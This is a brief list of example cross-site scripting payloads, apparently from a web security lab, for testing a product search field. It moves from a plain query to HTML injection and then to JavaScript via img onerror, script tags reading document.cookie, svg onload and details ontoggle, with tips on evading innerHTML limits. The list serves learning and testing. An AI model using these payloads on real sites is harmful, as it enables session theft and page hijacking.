Example payloads to try

Search for a legitimate term first, then try injecting HTML and JavaScript:

  • Coffee — legitimate search query; returns matching products.
  • <b>bold</b> — basic HTML injection; if the text appears bold, the application is rendering raw HTML.
  • <img src=x onerror=alert(1)> — image tag with an invalid src; the onerror event handler executes JavaScript when the image fails to load.
  • <script>alert(document.cookie)</script> — classic <script> injection; executes immediately when inserted into the DOM. Note: may not fire when injected via innerHTML — use event-handler-based payloads instead.
  • <svg onload=alert('XSS')> — SVG element with an onload event handler; executes JavaScript as soon as the element is rendered.
  • <details open ontoggle=alert('XSS')><summary>click</summary></details> — uses the ontoggle event on a <details> element; fires automatically because of the open attribute.
